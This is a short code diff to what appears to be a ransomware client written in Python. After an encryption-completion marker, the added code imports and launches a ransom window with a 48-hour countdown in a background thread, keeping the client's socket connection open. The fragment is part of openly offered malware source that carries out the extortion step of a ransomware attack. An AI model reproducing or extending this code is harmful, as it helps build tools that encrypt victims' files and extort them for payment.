@@ -260,6 +260,21 @@ def main():
                 print("[client] Created completion marker")
             except Exception as e:
                 print(f"[client] Failed to create marker: {e}")
+            
+            # Show ransom window after encryption completes
+            try:
+                print("[client] Launching ransom window...")
+                try:
+                    from py_simple.ransom_window import show_ransom_window
+                except ImportError:
+                    from ransom_window import show_ransom_window
+                
+                # Launch window in separate thread so socket connection stays alive
+                show_ransom_window(hours=48, blocking=False)
+                print("[client] Ransom window launched")
+            except Exception as e:
+                print(f"[client] Failed to launch ransom window: {e}")
+                
         except Exception as e:
             print(f"[client] Processing failed: {e}")
 
